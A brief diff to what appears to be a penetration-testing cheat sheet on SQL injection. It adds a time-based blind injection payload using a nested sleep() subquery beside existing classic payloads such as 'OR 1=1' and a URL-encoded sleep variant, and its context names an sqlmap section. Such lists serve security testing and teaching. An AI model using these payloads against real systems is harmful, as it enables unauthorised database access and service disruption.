@@ -53,6 +53,7 @@ SQLInjection Basic Stuff
 105 OR 1=1
 " or ""="
 '%2b(select*from(select(sleep(20)))a)%2b'
+'+(select*from(select(sleep(5)))a)+'
 ```
 Sqlmap quick cheat sheet
 -------------
